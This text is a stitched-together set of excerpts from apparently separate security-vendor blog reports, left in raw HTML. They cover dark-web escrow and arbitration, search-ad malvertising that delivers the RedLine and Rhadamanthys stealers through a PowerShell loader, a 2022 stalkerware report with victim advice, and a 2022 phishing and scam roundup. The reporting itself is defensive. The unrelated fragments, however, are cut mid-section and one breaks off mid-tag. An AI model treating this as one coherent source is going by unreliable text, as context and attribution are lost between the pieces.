Large sums of money are often on the table. To protect themselves from significant losses, cybercriminals use regulatory mechanisms, such as <em>escrow services </em>(aka <em>middlemen, intermediaries, or guarantors</em>), and<em> arbitration.</em> Escrow services control the fulfillment of agreements and reduce the risks of fraud in nearly every type of deal; arbiters act as a kind of court of law for cases where one of the parties of the deal tries to deceive the other(s). The administrators of the dark web sites, in turn, enforce arbiters&#8217; decisions and apply penalties to punish cheaters. Most often, these measures consist in blocking, banning, or adding to &#8220;fraudster&#8221; lists available to any member of community.</p>\n<h2 id=\"our-research\">Our research</h2>\n<p>We have studied publications on the dark web about deals involving escrow services for the period from January 2020 through December 2022. The sample includes messages from international forums and marketplaces on the dark web, as well as from publicly available Telegram channels used by cybercriminals. The total number of messages mentioning the use of an escrow agent in one way or another amounted to more than one million, of which almost 313,000 messages were published in 2022.</p>\n<div class=\"js-infogram-embed\"></div>\n<p><em>Dynamics of the number of messages on shadow sites mentioning escrow services in 2022.

We found that the rules and procedures for conducting transactions protected by escrow on various shadow platforms were almost the same, and the typical transaction pattern that involved escrow services was as follows.</p>\n<p><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/03/13160820/scheme-of-deal-scaled-1.jpg\"><img alt=\"\" class=\"aligncenter size-large wp-image-109037\" height=\"785\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/03/13160820/scheme-of-deal-scaled-1-1024x785.jpg\" width=\"1024\" /></a></p>\n<p>Besides the posts relating to escrow services, we analyzed those relating to arbitration and dispute settlement. We found that the format for arbitration appeals was also standardized. It usually included information about the parties, the value of the deal, a brief description of the situation, and the claimant&#8217;s expectations. In addition, parties sent their evidence privately to the appointed arbiter.</p>\n<h2 id=\"what-we-learned-about-dark-web-deal-regulation\">What we learned about dark web deal regulation</h2>\n<ul>\n<li>About half of the messages that mention the use of an escrow agent in one way or another in 2022 were posted on a platform specializing in cashing out and associated services.</li>\n<li>Cybercriminals resort to escrow services\u2014provided by escrow agents, intermediaries who are not interested in the outcome of the deal\u2014not just for one-time deals, but also when looking for long-term partners or hiring &#8220;employees&#8221;.</li>\n<li>These days, dark web forums create automated escrow systems to speed up and simplify relatively typical deals between cybercriminals.</li>\n<li>Any party may sabotage the deal: the seller, the buyer, the escrow agent, and even third parties using fake accounts to impersonate official representatives of popular dark web sites or escrow agents.</li>\n<li>The main motivation for complying with an agreement and playing fair is the party&#8217;s reputation in the cybercriminal community.</li>\n<li>A deal may involve up to five parties: the seller, the buyer, the escrow agent, the arbiter, and the administrators of the dark web site. Moreover, further arbiters may be involved if a party is not satisfied with the appointed arbiter&#8217;s decision and tries to appeal to another.</li>\n</ul>\n<h2 id=\"the-reasons-to-learn-how-business-works-on-the-dark-web\">The reasons to learn how business works on the dark web</h2>\n<p>Understanding how the dark web community operates, how cybercriminals interact with one another, what kinds of deals there are, how they are made, and what roles exist in them, is important when searching for information on the dark web and subsequently analyzing the data to identify possible threats to companies, government agencies, or certain groups of people. It helps information security experts find information faster and more efficiently without revealing themselves.</p>\n<p>Today, regular monitoring of the dark web for various cyberthreats \u2014 both attacks in the planning stages and incidents that have already occurred, such as compromise of corporate networks or leakage of confidential documents, is essential for countering threats in time, and mitigating the consequences of fraudulent or malicious activities. As the saying goes, forewarned is forearmed.</p>\n<p><a href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/03/10151223/Business-on-the-dark-web-deals-and-regulations.pdf?reseller=gl_regular-sm_acq_ona_oth__onl_b2b_securelist_lnk_sm-team______\" rel=\"noopener\" target=\"_blank\"><strong>Business on the dark web: deals and regulatory mechanisms \u2014</strong><strong> download the full version of the report (English, PDF)</strong></a></p>"

At least two different stealers, Rhadamanthys and RedLine, were abusing the search engine promotion plan in order to deliver malicious payloads to victims&#8217; machines. They seem to use the same technique of mimicking a website associated with well-known software like Notepad++ and Blender 3D.</p>\n<p>The treat actors create copies of legit software websites while employing <a href=\"https://encyclopedia.kaspersky.com/glossary/typosquatting/?utm_source=securelist&amp;utm_medium=blog&amp;utm_campaign=termin-explanation\" rel=\"noopener\" target=\"_blank\">typosquatting</a> (exploiting incorrectly spelled popular brands and company names as URLs) or combosquatting (using popular brands and company names combined with arbitrary words as URLs) to make the sites look like the real thing to the end user\u2014the domain names allude to the original software or vendor. The design and the content of the fake web pages look the same as those of the original ones. Threat actors then pay to promote the website in the search engine in order to push it to the top search results. The technique is called &#8220;malvertising&#8221;.</p>\n<h2 id=\"our-observations\">Our observations</h2>\n<p>In the following snapshots, we can see Google ads promoting fake pages for AMD drivers and the Blender 3D software. If we take a closer look at the URLs, we will see that the domain names incorporate the software name but are in fact unrelated to the real AMD or Blender 3D vendors. In most cases, the top-level domains are different from those of the official sites as well. The use of less common TLDs enables the threat actors to register second-level domains that are similar to the real ones. These domains lure victims to click on the link and access the fake website more often than random domains registered in a more common domain zone, such as COM, because they may look more like a legitimate website.</p>\n<p style=\"text-align: center;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/03/07150442/Malvertising_through_search_engines_01.png\"><img alt=\"Fake AMD and Blender 3D websites in search results\" class=\"aligncenter size-large wp-image-109003\" height=\"282\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/03/07150442/Malvertising_through_search_engines_01-1024x282.png\" width=\"1024\" /></a></p>\n<p style=\"text-align: center;\"><strong><em>Fake AMD and Blender 3D websites in search results</em></strong></p>\n<p>We visited some of the promoted sites and obtained the malicious payloads they were distributing.

This short-lived process is the loader for the malware.</p>\n<h2 id=\"the-loader\">The loader</h2>\n<p>The loader is a .NET file protected by an unregistered version of .NET Reactor. It seems to use an anti-debugging technique in order to prevent a debugger from executing and dynamically analyzing the binary. In a nutshell, the loader runs a new powershell.exe process and manipulates it to execute numerous PowerShell commands, which instruct it to access a third-party URL in order to get the payload. The payload is a base64-encoded, AES-encrypted fileless binary. Further commands are related to decoding and decrypting that binary, then running it in memory, within a newly created <em>aspnet_compiler.exe</em> process, a legitimate Windows .NET framework compilation tool.</p>\n<p>In this case, we observed two detection evasion tricks during the runtime:</p>\n<ul>\n<li>The fileless technique, which involves getting a payload from an online source and loading it directly into the memory of a process;</li>\n<li>LOLBAS (living-off-the-land binaries and scripts), which, in this case, is the use of a .NET compilation tool to run the malicious binary.</li>\n</ul>\n<p>Below, we provide a more detailed analysis of the loader execution chain. After passing the loader anti-debugger, we can see that it starts a PowerShell process, so we will put a breakpoint at the CreateProcessW WinAPI call to observe the behavior.</p>\n<p style=\"text-align: center;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/03/07173107/Malvertising_through_search_engines_06.png\"><img alt=\"Call of CreateProcessW to spawn a PowerShell process\" class=\"aligncenter size-large wp-image-109010\" height=\"457\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/03/07173107/Malvertising_through_search_engines_06-1024x457.png\" width=\"1024\" /></a></p>\n<p style=\"text-align: center;\"><strong><em>Call of CreateProcessW to spawn a PowerShell process</em></strong></p>\n<p>Since we did not see any command passed to the PowerShell process when initializing it via the CreateProcessW call, we can conclude that it will be passed at some point later, so we can observe the passing of the PowerShell command(s) by putting a breakpoint at WinAPI WriteFile in order to see the command lines for the powershell.exe process.</p>\n<p>So, after letting it run and reach the breakpoint, we will check the result in the return of the function call, and we can see in the stack that the first command pushed to the powershell.exe process was <em>#Start-Sleep -seconds 30;</em>.</p>\n<p style=\"text-align: center;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/03/07173235/Malvertising_through_search_engines_07.png\"><img alt=\"Observing the pushed command(s)\" class=\"aligncenter size-large wp-image-109011\" height=\"551\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/03/07173235/Malvertising_through_search_engines_07-1024x551.png\" width=\"1024\" /></a></p>\n<p style=\"text-align: center;\"><strong><em>Observing the pushed command(s)</em></strong></p>\n<p>We can try checking the memory section where the command is stored and searching for other commands that are being kept in the memory for later use by the loader.</p>\n<p style=\"text-align: center;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/03/07173310/Malvertising_through_search_engines_08.png\"><img alt=\"Memory address of the pushed PowerShell commands\" class=\"aligncenter size-full wp-image-109012\" height=\"376\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/03/07173310/Malvertising_through_search_engines_08.png\" width=\"525\" /></a></p>\n<p style=\"text-align: center;\"><strong><em>Memory address of the pushed PowerShell commands</em></strong></p>\n<p>After taking all the data from this memory section, we will see all the commands passed to the powershell.exe process via the WriteFile WinAPI call.</p>\n<p style=\"text-align: center;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/03/07173344/Malvertising_through_search_engines_09.png\"><img alt=\"PowerShell commands\" class=\"aligncenter size-large wp-image-109013\" height=\"350\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/03/07173344/Malvertising_through_search_engines_09-1024x350.png\" width=\"1024\" /></a></p>\n<p style=\"text-align: center;\"><strong><em>PowerShell commands</em></strong></p>\n<p>If we read the commands, we will see exactly what the powershell.exe process is about to do.

In some cases, such as the one described in this article, the threat actors also make sure to install the desired software alongside their malicious payload.</p>\n<p>In recent campaigns, we observed mainly stealer-type malware, such as RedLine or the notorious Rhadamanthys, which is also known to use malvertising techniques to reach victims and steal data from their compromised machines.</p>\n<p>This kind of distribution suggests that the threat actors are targeting victims, both individual and corporate, all around the world.</p>\n<h2

Stalkerware is a commercially available software that can be discretely installed on smartphone devices, enabling perpetrators to monitor an individual&#8217;s private life without their knowledge.</p>\n<p>Stalkerware can be downloaded and easily installed by anyone with an Internet connection and physical access to a smartphone. A perpetrator violates the victim&#8217;s privacy as they can then use the software to monitor huge volumes of personal data. Depending on the type of software, it is usually possible to check device location, text messages, social media chats, photos, browser history and more. Stalkerware works in the background, meaning that most victims will unaware that their every step and action is being monitored.</p>\n<p>In most countries around the world, the use of stalkerware software is currently not prohibited but installing such an application on another individual&#8217;s smartphone without their consent is illegal and punishable. However, it is the perpetrator who will be held responsible, not the developer of the application.</p>\n<p><strong>Along with other related technologies, stalkerware is part of tech-enabled abuse and often used in abusive relationships.</strong> As this is part of a wider problem, Kaspersky is working with relevant experts and organizations in the field of domestic violence, ranging from victim support services and perpetrator programs through to research and government agencies, to share knowledge and support professionals and victims alike.</p>\n<h3 id=\"2022-data-highlights\">2022 data highlights</h3>\n<ul>\n<li><strong>In 2022, Kaspersky data shows that 29,312 unique individuals around the world were affected by stalkerware. </strong>Compared to the downwards trend that has been recorded in previous years, this is similar to the total number of affected users in 2021. Taking into account the developments in digital stalking software over the past few years, the data suggests there is a trend towards stabilization. More broadly, it is important to note that the data covers the affected number of Kaspersky users, with the global number of affected individuals likely to be much higher. Some affected users may use another cybersecurity solution on their devices, while some do not use any solution at all.</li>\n<li><strong>In addition, the data reveals a stable proliferation of stalkerware over the 12 months of 2022. </strong>On average, 3333 users each month were newly affected by stalkerware. The stable detection rate indicates that digital stalking has become a persistent problem that warrants wider societal attention. Members from the <a href=\"https://stopstalkerware.org/\" rel=\"noopener\" target=\"_blank\">Coalition Against Stalkerware</a> estimate that there could be close to one million victims globally affected by stalkerware every year.</li>\n<li>According to the Kaspersky Security Network, <strong>stalkerware is most commonly used in Russia, Brazil, and India</strong>, but continues to be a global phenomenon affecting all countries. Regionally, the data reveals that the largest number of affected users can be found in the following countries:\n<ul>\n<li>Germany, Italy, and France (Europe);</li>\n<li>Iran, Turkey, and Saudi Arabia (Middle East and Africa);</li>\n<li>India, Indonesia, and Australia (Asia-Pacific);</li>\n<li>Brazil, Mexico, and Ecuador (Latin America);</li>\n<li>United States (North America);</li>\n<li>Russian Federation, Kazakhstan and Belarus (Eastern Europe (except European Union countries), Russia and Central Asia).</li>\n</ul>\n</li>\n<li>Globally, the most commonly used stalkerware app is Reptilicus with 4,065 affected users.</li>\n</ul>\n<h2 id=\"2022-trends-observed-by-kaspersky\">2022 trends observed by Kaspersky</h2>\n<h3 id=\"methodology\">Methodology</h3>\n<p>The data in this report has been taken from aggregated threat statistics obtained from the Kaspersky Security Network. The Kaspersky Security Network is dedicated to processing cybersecurity-related data streams from millions of volunteer participants around the world. All received data is anonymized. To calculate the statistics, the consumer line of Kaspersky&#8217;s mobile security solutions has been reviewed according to the Coalition Against Stalkerware&#8217;s detection criteria on stalkerware. This means that the affected number of users have been targeted by stalkerware only.

Their capabilities vary depending on the type of application and whether it has been paid for or obtained freely. Typically, stalkerware masquerades as legitimate anti-theft or parental control apps, when in reality they are very different &#8211; most notably due to their installation without consent and notification of the person being tracked, and their operation in stealth mode on smartphone devices,</p>\n<p>Below are some of the most common functions that may be present in stalkerware applications:</p>\n<ul>\n<li>Hiding app icon</li>\n<li>Reading SMS, MMS and call logs</li>\n<li>Getting lists of contacts</li>\n<li>Tracking GPS location</li>\n<li>Tracking calendar events</li>\n<li>Reading messages from popular messenger services and social networks, such as Facebook, WhatsApp, Signal, Telegram, Viber, Instagram, Skype, Hangouts, Line, Kik, WeChat, Tinder, IMO, Gmail, Tango, SnapChat, Hike, TikTok, Kwai, Badoo, BBM, TextMe, Tumblr, Weico, Reddit etc.</li>\n<li>Viewing photos and pictures from phones&#8217; image galleries</li>\n<li>Taking screenshots</li>\n<li>Taking front (selfie-mode) camera photos</li>\n</ul>\n<h3 id=\"are-android-os-and-ios-devices-equally-affected-by-stalkerware\">Are Android OS and iOS devices equally affected by stalkerware?</h3>\n<p>Stalkerware tools are less frequent on iPhones than on Android devices because iOS is traditionally a closed system. However, perpetrators can work around this limitation on &#8216;jailbroken&#8217; iPhones, but they still require direct physical access to the phone to jailbreak it. iPhone users fearing surveillance should always keep an eye on their device.</p>\n<p>Alternatively, an abuser can offer their victim an iPhone \u2013 or any other device \u2013 with pre-installed stalkerware. There are many companies that make these services available online, allowing abusers to have these tools installed on new phones, which can then be delivered in factory packaging under the guise of a gift to the intended victim.</p>\n<h2 id=\"together-keeping-up-the-fight-against-stalkerware\">Together keeping up the fight against stalkerware</h2>\n<p>Stalkerware is foremost not a technical problem, but an expression of a problem within society which therefore requires action from all areas of society. Kaspersky is not only actively committed to protecting users from this threat but also maintaining a multilevel dialogue with non-profit organizations, and industry, research and public agencies around the world to work together on solutions that tackle the issue.</p>\n<p>In 2019, Kaspersky was the first cybersecurity company in the industry to develop a new attention-grabbing alert that clearly notifies users if stalkerware is found on their device. While Kaspersky&#8217;s solutions have been flagging potentially harmful apps that are not malware \u2013 including stalkerware \u2013 for many years, the new notification alerts the user to the fact that an app has been found on their device that may be able to spy on them.</p>\n<p>In 2022, as part of Kaspersky&#8217;s launch of a new consumer product portfolio, the Privacy Alert was expanded and now not only informs the user about the presence of stalkerware on the device, but also warns the user that if stalkerware is removed the person who installed the app will be alerted. This may lead to an escalation of the situation. Moreover, the user risks erasing important data or evidence that could be used in a prosecution. Figure 2, below, shows the new warning in the blue box. Kaspersky&#8217;s Privacy Alert is included in all of the company&#8217;s consumer security solutions to protect against stalkerware.</p>\n<p>In 2019, Kaspersky also co-founded the <a href=\"https://stopstalkerware.org/\" rel=\"noopener\" target=\"_blank\">Coalition Against Stalkerware</a>, an international working group against stalkerware and domestic violence that brings together private IT companies, NGOs, research institutions, and law enforcement agencies working to combat cyberstalking and help victims of online abuse. Through a consortium of more than 40 organizations, stakeholders can share expertise and work together to solve the problem of online violence. In addition, the Coalition&#8217;s website, which is available in 7 different languages, provides victims with help and guidance in case they may suspect stalkerware is present on their devices.</p>\n<p>From 2021-2023, Kaspersky was a consortium partner of the EU project <a href=\"https://www.work-with-perpetrators.eu/destalk\" rel=\"noopener\" target=\"_blank\">DeStalk</a>, co-funded by the Rights, Equality, and Citizenship Program of the European Union. The five project partners that formed the consortium combined the expertise of the IT Security Community, Research, and Civil Society Organizations, and Public Authorities. As a result, the DeStalk project trained a total of 375 professionals directly working in women&#8217;s support services and perpetrator programs, and officials from public authorities on how to effectively tackle stalkerware and other digital forms of gender-based violence, as well as raising public awareness on digital violence and stalkerware.</p>\n<p>As part of the project, Kaspersky developed an e-learning course on cyberviolence and stalkerware within its Kaspersky Automated Security Awareness Platform, a freely available online micro learning training platform which can be accessed in five different languages. To date, more than 130 professionals have completed the e-learning course with a further 80 currently participating. Although the DeStalk project has ended, the e-learning course is still available <a href=\"https://www.work-with-perpetrators.eu/destalk\" rel=\"noopener\" target=\"_blank\">on the DeStalk project website</a>.</p>\n<p>In June 2022, Kaspersky launched a website dedicated to <a href=\"https://tiny-check.com/#/\" rel=\"noopener\" target=\"_blank\">TinyCheck</a> to disseminate further information about the tool. TinyCheck is a free, safe and <a href=\"https://github.com/KasperskyLab/TinyCheck#readme\" rel=\"noopener\" target=\"_blank\">open-source tool</a> that can be used by non-profit organizations and police units to help support victims of digital stalking. In 2020, the tool was created to check devices for stalkerware and monitoring apps without making the perpetrator aware of the check. It does not require installation on a user&#8217;s device because it works independently to avoid detection by a stalker. TinyCheck scans a device&#8217;s outgoing traffic using a regular Wi-Fi connection and identifies interactions with known sources such as stalkerware-related servers. TinyCheck can also be used to check any device on any platform, including iOS, Android, or any other OS&#8217;.</p>\n<h2 id=\"think-you-are-a-victim-of-stalkerware-here-are-a-few-tips\">Think you are a victim of stalkerware? Here are a few tips\u2026</h2>\n<p>Whether or not you are a victim of stalkerware, here are a few tips to better protect yourself:</p>\n<ul>\n<li>Protect your phone with a strong password that you never share with your partner, friends, or colleagues.</li>\n<li>Change passwords for all of your accounts periodically and don&#8217;t share them with anyone.</li>\n<li>Only download apps from official sources, such as Google Play or the Apple App Store.</li>\n<li>Install a reliable IT security solution like Kaspersky for Android on devices and scan them regularly. However, in the case of potentially already installed stalkerware, this should only be done after the risk to the victim has been assessed, as the abuser may notice the use of a cybersecurity solution.</li>\n</ul>\n<p>Victims of stalkerware may be victims of a larger cycle of abuse, including physical.</p>\n<p>In some cases, the perpetrator is notified if their victim performs a device scan or removes a stalkerware app. If this happens, it can lead to an escalation of the situation and further aggression. This is why it is important to proceed with caution if you think you are being targeted by stalkerware.</p>\n<ul>\n<li><strong>Reach out to a local support organization</strong>: to find one close to you, check the <a href=\"https://stopstalkerware.org/resources/\" rel=\"noopener\" target=\"_blank\"><strong>Coalition Against Stalkerware website</strong></a>.</li>\n<li><strong>Keep an eye out for the following warning signs</strong>: these can include a fast-draining battery due to unknown or suspicious apps using up its charge, and newly installed applications with suspicious access to use and track your location, send or receive text messages and other personal activities. Also check if your &#8220;unknown sources&#8221; setting is enabled, it may be a sign that unwanted software has been installed from a third-party source. However, the above indicators are circumstantial and do not indicate the unequivocal presence of stalkerware on the device.</li>\n<li><strong>Do not try to erase the stalkerware, change any settings or tamper with your phone</strong>: this may alert your potential perpetrator and lead to an escalation of the situation. You also risk erasing important data or evidence that could be used in a prosecution.</li>\n</ul>\n<p>For more information about our activities on stalkerware or any other request, please write to us at: <a href=\"mailto:ExtR@kaspersky.com\" rel=\"noopener\" target=\"_blank\">ExtR@kaspersky.com</a>.</p>"

That said, cybercriminals are still working on improving both malware functionality and spread vectors. Malware is increasingly spreading through legitimate channels, such as official marketplaces and ads in popular apps. This is true for both scam apps and dangerous mobile banking malware.</p>\n<p>Potentially unwanted applications (RiskWare) accounted for a majority of newly detected threats in 2022, replacing the previous leader, adware. Most mobile cyberattacks used malware as before.</p>"

The bait included the most awaited and talked-about releases: the new season of Stranger Things, the new Batman movie, and the Oscar nominees. Short-lived phishing sites often offered to see the premieres before the eagerly awaited movie or television show was scheduled to hit the screen. Those who just could not wait were in for a disappointment and a waste of cash. The promises of completely free access to the new content were never true. By clicking what appeared to be a link to the movie, the visitor got to view the official trailer or a film studio logo. Several seconds into the &#8220;preview&#8221;, the stream was interrupted by an offer to buy an inexpensive subscription right there on the website to continue watching. If the movie lover entered their bank card details on the fake site, they risked paying more than the displayed amount for content that did not exist and sharing their card details with the scammers.</p>\n<p style=\"text-align: center;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/02/13132238/spam-phishing-report-2022-01.png\"><img alt=\"\" class=\"aligncenter size-large wp-image-108695\" height=\"546\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/02/13132238/spam-phishing-report-2022-01-1024x546.png\" width=\"1024\" /></a></p>\n<p>Some websites that offered soccer fans free broadcasts of the FIFA World Cup in Qatar employed a similar scheme, but the variety of hoaxes aimed at soccer fans proved to be wider than that used by scammers who attacked film lovers.

For example, one website offered users to obtain a COVID vaccination certificate by entering their British National Health Service (NHS) account credentials. Others offered the coveted Green Pass without vaccination.</p>\n<p style=\"text-align: center;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/02/13141812/spam-phishing-report-2022-06.png\"><img alt=\"\" class=\"aligncenter size-large wp-image-108700\" height=\"653\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/02/13141812/spam-phishing-report-2022-06-1024x653.png\" width=\"1024\" /></a></p>\n<p>Scammers abused legitimate survey services by creating polls in the name of various organization to profit from victims&#8217; personal, including sensitive, data. In another COVID-themed scheme, the con artists introduced themselves as the Direct Relief charity, which helps to improve the quality of life and healthcare in poorer regions. Visitors were offered to fill out a form to be eligible for $750 per week in aid for twenty-six weeks. The survey page said the &#8220;charity&#8221; found the victim&#8217;s telephone number in a database of individuals affected by COVID-19. Those who wished to receive the &#8220;aid&#8221; were asked to state their full name, contact details, date of birth, social security and driver&#8217;s license numbers, gender, and current employer, attaching a scanned copy of their driver&#8217;s license. To lend an air of authenticity and to motivate the victim to enter valid information, the swindlers warned that the victim could be prosecuted for providing false information. The scheme likely aimed at identity theft: the illegal use of others&#8217; personal details for deriving profit. The cybercrooks might also use the data to contact their victims later, staging a more convincing swindle.</p>\n<p style=\"text-align: center;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/02/13141841/spam-phishing-report-2022-07.png\"><img alt=\"\" class=\"aligncenter size-large wp-image-108701\" height=\"741\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/02/13141841/spam-phishing-report-2022-07-1024x741.png\" width=\"1024\" /></a></p>\n<h3 id=\"crypto-phishing-and-crypto-scams\">Crypto phishing and crypto scams</h3>\n<p>The unabated popularity of cryptocurrency saw crypto scammers&#8217; interest in wallet owners&#8217; accounts growing, despite the fact that rates continued to drop throughout the year.

Unlike common easy-money scams, these websites asked for payments in cryptocurrency \u2014 which they promised to give away and which they were trying to steal. The &#8220;giveaways&#8221; were timed to coincide with events that were directly or indirectly associated with cryptocurrency. Thus, one of the fake sites promised prizes on the occasion of Nvidia thirty-year anniversary (the company is a major vendor of graphics processing units, which are sometimes used for crypto mining). Promotion of cryptocurrency use was another pretext for the &#8220;giveaways&#8221;. Users were offered to deposit up to 100 cryptocurrency units for a promise to refund two times that amount, purportedly to speed up digital currency adoption. In reality, the scheme worked the way any other internet hoax would: the self-professed altruists went off the radar once they received the deposit.</p>\n<p style=\"text-align: center;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/02/13142443/spam-phishing-report-2022-09.png\"><img alt=\"\" class=\"aligncenter size-large wp-image-108703\" height=\"457\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/02/13142443/spam-phishing-report-2022-09-1024x457.png\" width=\"1024\" /></a></p>\n<h3 id=\"compensation-bonus-and-paid-survey-scams\">Compensation, bonus, and paid survey scams</h3>\n<p>Bonuses and compensations are hard to deny in times of crisis and instability, but it is worth keeping in mind that &#8220;financial assistance&#8221; is frequently promised by con artists to swindle you out of your money.</p>\n<p>&#8220;Promotional campaigns by major banks&#8221; were a popular bait in 2022. Visitors to a fraudulent web page were offered to receive a one-time payment or to take a service quality survey for a fee. Unlike the prizes offered in the aforementioned crypto schemes, these fees were smaller: an equivalent of $30\u201340. The cybercriminals used an array of techniques to lull victims&#8217; vigilance: company logos, assurances that the campaigns were legit, as well as detailed, lifelike descriptions of the offer. Similar &#8220;campaigns&#8221; were staged in the name of other types of organizations, for example, the Polish finance ministry.</p>\n<p style=\"text-align: center;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/02/13142523/spam-phishing-report-2022-10.png\"><img alt=\"\" class=\"aligncenter size-large wp-image-108704\" height=\"511\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/02/13142523/spam-phishing-report-2022-10-1024x511.png\" width=\"1024\" /></a></p>\n<p>Aid as distributed by various governmental and nongovernmental organizations remained a popular fraud theme in 2022. For example, in Muslim countries, scammers promised to send charity packages, purportedly under a &#8220;Ramadan Relief&#8221; program that aimed at helping low-income families during the Ramadan fast. The fasting period typically sees higher prices for food and household products, whereas observers buy more than they normally do and may be faced with a shortage of money. Legitimate charities, such as <a href=\"https://wfaid.org/rrf/\" rel=\"noopener\" target=\"_blank\">WF-AID</a>, do operate Ramadan relief programs, and judging by the screenshot below, the fraudsters were pretending to represent that organization. An eye-catching picture of the organization&#8217;s logo and huge boxes was accompanied by a list of foodstuffs included in the aid package, with positive &#8220;recipient feedback&#8221; posted below the message. The victim was asked to make sure that their name was on the list of recipients, so they could get a package. This required providing personal data on the website and sending a link to the scam site to instant messaging contacts\u2014nothing extraordinary for hoaxes like this. This way, the scammers both populate their databases and have victims spread links to their malicious resources for them. In addition to that, they might ask the victim to cover the &#8220;shipping costs&#8221;.</p>\n<p style=\"text-align: center;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/02/13142600/spam-phishing-report-2022-11.png\"><img alt=\"\" class=\"aligncenter size-large wp-image-108705\" height=\"1024\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/02/13142600/spam-phishing-report-2022-11-992x1024.png\" width=\"992\" /></a></p>\n<p>Growing utility rates and an increase in the price of natural resources have prompted several governments to start discussing compensations for the population. Payout notices could arrive by mail, email, or as a text message. Cybercriminals attempted to take advantage of the situation by creating web pages that mimicked government websites, promising cash for covering utility payments or compensation of utility expenses. Visitors were occasionally asked to provide personal details under the pretext of checking that they were eligible, or simply to fill out a questionnaire. In Britain, con artists posing as a government authority promised to compensate electricity costs. The description of the one-time payout was copied from the official website of the authority, which did provide the type of compensation. After completing the questionnaire, the victim was asked to specify the electric utility whose services they were using and enter the details of the bank card linked to their account with the utility. The promise of \u00a3400 was supposed to make the victim drop their guard and share their personal information.</p>\n<p style=\"text-align: center;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/02/13142636/spam-phishing-report-2022-12.png\"><img alt=\"\" class=\"aligncenter size-large wp-image-108706\" height=\"434\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/02/13142636/spam-phishing-report-2022-12-1024x434.png\" width=\"1024\" /></a></p>\n<p>In Singapore, scammers offered a refund of water supply costs, purportedly because of double billing.

Phishing attacks targeted both the customers of globally known retailers and regional players. An attack often started with the victim receiving a link to a certain product supposedly offered at an attractive price, by email, in an instant messaging app, or on a social network. Those who fell for the trick could lose access to their accounts, have their bank card details stolen, or waste the money they wanted to spend on the dirt-cheap item.</p>\n<p style=\"text-align: center;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/02/13142737/spam-phishing-report-2022-14.png\"><img alt=\"\" class=\"aligncenter size-large wp-image-108708\" height=\"515\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/02/13142737/spam-phishing-report-2022-14-1024x515.png\" width=\"1024\" /></a></p>\n<p>&#8220;Insides&#8221; about &#8220;private sales&#8221; were also used as a lure. Thus, a web page that copied the appearance of a Russian marketplace promised discounts of up to 90% on all items listed on it. The page design did look credible, with the only potential red flags being really low prices and the URL in the address bar not matching the official one.</p>\n<p>Many large vendors, notably in the home appliances segment, announced in early spring that they would be pulling out of Russia, which caused a spike in demand. This was reflected in the threat landscape, with fake online stores offering home appliances popping up all over the Russian segment of the internet (also called Runet). Large retailers being out of stock, combined with unbelievably low prices, made these offers especially appealing. The risk associated with making a purchase was to lose a substantial amount of money and never to receive what was ordered.</p>\n<p style=\"text-align: center;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/02/13142817/spam-phishing-report-2022-15.jpg\"><img alt=\"\" class=\"aligncenter size-large wp-image-108709\" height=\"665\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/02/13142817/spam-phishing-report-2022-15-1024x665.jpg\" width=\"1024\" /></a></p>\n<h3 id=\"hijacking-of-social-media-accounts\">Hijacking of social media accounts</h3>\n<p>Users of social media have increasingly focused on privacy lately. That said, curiosity is hard to contain: people want to check out who has been following them, but do so without the other party knowing. Cybercriminals who were after their account credentials offered victims to have their cake and eat it by using some new social media capability. A fake Facebook Messenger page promised to install an update that could change the user&#8217;s appearance and voice during video calls, and track who has been viewing their profile, among other features. To get the &#8220;update&#8221;, the victim was asked to enter their account credentials, which the scammers immediately took over.</p>\n<p style=\"text-align: center;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/02/13142852/spam-phishing-report-2022-16.png\"><img alt=\"\" class=\"aligncenter size-full wp-image-108710\" height=\"497\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/02/13142852/spam-phishing-report-2022-16.png\" width=\"817\" /></a></p>\n<p>Many Instagram users dream about the Blue Badge, which stands for verified account and is typically reserved for large companies or media personalities.

